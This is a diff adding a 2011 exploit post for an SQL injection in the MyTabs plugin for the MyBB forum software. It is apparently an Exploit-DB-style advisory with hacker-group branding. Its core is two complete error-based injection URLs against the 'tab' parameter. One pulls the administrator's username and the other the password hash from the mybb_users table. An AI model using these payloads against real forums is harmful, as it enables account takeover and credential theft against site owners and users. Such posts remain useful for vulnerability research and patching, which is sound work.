@@ -1,0 +1,51 @@
+=====================================================================
+MyBB 0day \ MyTabs (plugin) SQL injection vulnerability
+=====================================================================
+
+# Exploit title :  MyBB 0day \ MyTabs (plugin) SQL injection vulnerability.
+# Author: AutoRUN & dR.sqL
+# Home : HackForums.AL , Autorun-Albania.COM , HackingWith.US , whiteh4t.com
+# Date : 01 \ 08 \ 2011
+# Tested on : Windows XP , Linux
+# Category : web apps
+# Vulnerable Software Link : http://mods.mybb.com/view/mytabs
+# Google dork : Use your mind kid ^_^ !
+
+Vulnerability :
+
+$~ http://localhost/mybbpath/index.php?tab=[SQLi]
+
+---------------------------------------
+#           ~ Expl0itation ~            #
+---------------------------------------
+
+$~ Get the administrator's username (usually it has uid=1) ~
+
+http://localhost/mybbpath/index.php?tab=1' and(select 1 from(select count(*),concat((select username from mybb_users where uid=1),floor(Rand(0)*2))a from information_schema.tables group by a)b)-- -
+
+$~ Get the administrator's password ~
+
+http://localhost/mybbpath/index.php?tab=1' and(select 1 from(select count(*),concat((select password from mybb_users where uid=1),floor(Rand(0)*2))a from information_schema.tables group by a)b)-- -
+
+
+     _         _        ____  _   _ _   _                   _       _ ____              _     
+    / \  _   _| |_ ___ |  _ \| | | | \ | |   __ _ _ __   __| |   __| |  _ \   ___  __ _| |    
+   / _ \| | | | __/ _ \| |_) | | | |  \| |  / _` | '_ \ / _` |  / _` | |_) | / __|/ _` | |    
+  / ___ \ |_| | |_ (_) |  _ <| |_| | |\  | | (_| | | | | (_| | | (_| |  _ < _\__ \ (_| | |___ 
+ /_/   \_\__,_|\__\___/|_| \_\\___/|_| \_|  \__,_|_| |_|\__,_|  \__,_|_| \_(_)___/\__, |_____|
+                                                                                     |_|      
+
+
+
+# Greetz : Programer , Dr.moka, eragon, BaDBoY-AL , z3r0w1zard , Red Dragon_aL , Pretorian ,Th3_Power , R-t33n , Ace Wizard, KubaNnez1 , ssgodfather, DJDukli , b4ti , CroSs HackForums.AL members & All our friends.
+
+
+
+  ____                      _   ____  ____       _    _ _                 _               _ 
+ |  _ \ _ __ ___  _   _  __| | |___ \| __ )     / \  | | |__   __ _ _ __ (_) __ _ _ __   | |
+ | |_) | '__/ _ \| | | |/ _` |   __) |  _ \    / _ \ | | '_ \ / _` | '_ \| |/ _` | '_ \  | |
+ |  __/| | | (_) | |_| | (_| |  / __/| |_) |  / ___ \| | |_) | (_| | | | | | (_| | | | | |_|
+ |_|   |_|  \___/ \__,_|\__,_| |_____|____/  /_/   \_\_|_.__/ \__,_|_| |_|_|\__,_|_| |_| (_)
+                                                                                            
+
+# 2011
